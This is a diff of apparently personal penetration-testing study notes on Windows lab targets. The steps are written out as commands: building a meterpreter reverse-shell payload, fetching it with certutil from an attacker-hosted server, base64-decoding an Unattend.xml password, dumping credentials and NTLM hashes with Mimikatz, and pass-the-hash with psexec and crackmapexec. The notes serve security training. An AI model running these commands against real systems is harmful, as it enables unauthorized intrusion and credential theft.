@@ -532,23 +532,17 @@ Unattended Windows Setup
 Demo - find password of administrator within a legitimate windows config file 
 
 1. get access to victim 
-	- generate meterpreter payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe >payload.exe 
-	- python -m SimpleHTTPServer 80 
-		- This command starts a simple HTTP server using Python. The server listens on port 80, which is the default port for HTTP traffic. The reason why Python's built-in HTTP server is used to host the payload (`payload.exe`) is that it provides a convenient and lightweight way to serve the file to potential victims. By hosting the file on a server, an attacker can share the payload's download link and trick users into downloading and executing the malicious file. Once executed, the meterpreter payload establishes a reverse TCP connection back to the attacker's machine, enabling them to gain unauthorized access and control over the victim's system. 
+	- generate meterpreter payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe >payload.exe `
+	- `python -m SimpleHTTPServer 80 `
 	- Transfer file to victim system: 
 		- open cmd in victim system;
-			- certutil -urlcache -f  http://yourip/payload.exe payload.exe 
-				- - `certutil`: This is a command-line tool available in Windows operating systems. It is primarily used for managing certificates and certificate-related operations.
-				- `-urlcache`: This option is used to download a file from a specified URL and cache it on the local system.
-				- `-f`: This option stands for "force," and it is used to overwrite any existing file with the same name during the download.
-				- `http://yourip/payload.exe`: This is the URL of the file you want to download. Replace `yourip` with the IP address or domain where the file is hosted.
-				- `payload.exe`: This is the name given to the downloaded file on the local system.
+			- `certutil -urlcache -f  http://yourip/payload.exe payload.exe` 
 	- go back to webserver and shut it down (file has been downloaded)
 	- set up msfconsole and set up multi/handler 
-		- set payload windows/x64/meterpreter/reverse_tcp, LPORT 1234 LHOST kali ip 
+		- set payload `windows/x64/meterpreter/reverse_tcp,` LPORT 1234 LHOST kali ip 
 		- Once you go back to the victim system and you click on the payload a meterpreter session will be started in the multi/handler 
-		- sysinfo 
-		- search -f Unattend.xml    (located: C:\\\Windows\\Panther\\Unattend.xml)
+		- `sysinfo` 
+		- `search -f Unattend.xml `   (located: C:\\\Windows\\Panther\\Unattend.xml)
 		- cd to C:\\Windows\\Panther\\Unattend.xml
 		- dir 
 		- download unattend.xml 
@@ -557,10 +551,10 @@ Demo - find password of administrator within a legitimate windows config file
 		- cat unattend.xml
 		- look for user credentials  (autologon)
 		- the password (plaintext is false) is in base64 
-		- we create a new file: vim password.txt 
+		- we create a new file: `vim password.txt `
 			- paste the base64 password, quit 
-		- use base64 package: base64 -d password.txt 
-		- test the password: psexec.py Administrator@targetip 
+		- use base64 package: `base64 -d password.txt `
+		- test the password: `psexec.py Administrator@targetip `
 			- enter password 
 			- whoami 
 
@@ -582,7 +576,7 @@ Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploi
 Objective: Gain access to meterpreter session with high privileg
 
 
-- The command "powershell -ep bypass" is used to launch a PowerShell session with the execution policy bypassed 
+- The command "`powershell -ep bypass`" is used to launch a PowerShell session with the execution policy bypassed 
 ![[Pasted image 20230707163044.png]]
 
 ![[Pasted image 20230707163028.png]]
@@ -606,38 +600,40 @@ Mimikatz
 Demo 
 - perform nmap 
 - start up mfsconsole 
-- search exploit module for BadBlue 
-- use the passthru , configure rhost, lhost and lport and exploit
+- search exploit module for `BadBlue` 
+- use the `passthru` , configure rhost, lhost and lport and exploit
 - meterpreter session on the target system 
-	- sysinfo 
-	- getuid 
-	- migrate to lsass.exe find processid: pgrep lsass - migrate to lsass
+	- `sysinfo` 
+	- `getuid` 
+	- migrate to lsass.exe find processid: `pgrep lsass` - migrate to lsass
 		- we need higher priviliges for lsass 
 	- sysinfo (authority\\system is the highest privileges')
 	- we will use kiki
-		- load kiwi 
-		- ?
-		- attempt to retrieve credentials such as usernames, passwords, domain information, and NTLM hashes for logged-in users.: **creds_all** 
+		- `load kiwi `
+		- `?`
+		- attempt to retrieve credentials such as usernames, passwords, domain information, and NTLM hashes for logged-in users.: `**creds_all** `
 			- later versions of  windows  do not store cleartext passwords 
-		- Mimikatz commands can be used to extract NTLM hashes via the LSA: **lsa_dump_sam** 
+		- Mimikatz commands can be used to extract NTLM hashes via the LSA:` **lsa_dump_sam** `
 			- SAM is encrypted with syskey, also provided by kiwi 
 			- specifically targets the SAM database to retrieve password hashes.
 		- clear 
 	- pwd 
 	- navigate to C:\\\\ 
-		- mkdir Temp 
-		- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+		`- mkdir Temp `
+		- `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
 		- open a command shell session: shell
-			- dir 
-			- execute mimikatz: .\\mimikatz.exe 
-			- privilege::debug ![[Pasted image 20230707131337.png]]
+			- `dir` 
+			- execute mimikatz:` .\\mimikatz.exe `
+			- `privilege::debug `![[Pasted image 20230707131337.png]]
 							 if it is 20= you have required privileges to perform hash extraction from memory 
-		- Mimikatz: lsadump::sam
-			- RID 500 -> this is indeed administrator 
+		- Mimikatz: `lsadump::sam`
+			- **RID 500** -> this is indeed administrator 
 		- Mimikatz: lsadump::secret 
 		- Mimikatz: sekurlsa::logonpasswords  ![[Pasted image 20230707132811.png]]
 				null means cleartext passwords have been disabled 
 		- 
+
+
 
 1. **"lsa_dump_all"** is a Kiwi command in Mimikatz that is used to dump various types of information from the Local Security Authority (LSA) subsystem. It retrieves data such as secrets, cached credentials, security packages, and other relevant information stored in the LSA.
     
@@ -657,17 +653,6 @@ Objective: Exploit the application and find all the flags.
 
 - Find Administrator and Student users NTLM hash.
 - Dump LSA secrets to find Syskey
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -721,16 +706,13 @@ Demo
 			  
 Above we used psexec for pas the hash attack but you can also use other tools such as: crackmapexe
 
-- crackmapexec smb targetip -u Administrator -H "{hash}"
+- `crackmapexec smb targetip -u Administrator -H "{hash}"`
 - try to execute commands
-	- crackmapexec smb targetip -u Administrator -H "{hash}" -x "ipconfig"
-	- crackmapexec smb targetip -u Administrator -H "{hash}" -x "net user"
+	- `crackmapexec smb targetip -u Administrator -H "{hash}" -x "ipconfig"`
+	- `crackmapexec smb targetip -u Administrator -H "{hash}" -x "net user"`
 
 
 
 In summary, CrackMapExec is focused on password auditing and Windows network exploitation, Evil-WinRM enables remote command execution on Windows systems, Cadaver is used for interacting with WebDAV servers, and msfvenom is a payload generator for creating malicious payloads within the Metasploit Framework. 
-
-
-
 
 (doe de pass the hash attacks nog een keer en loop nauwkeurig door omdat het in powershel lgebeurt )
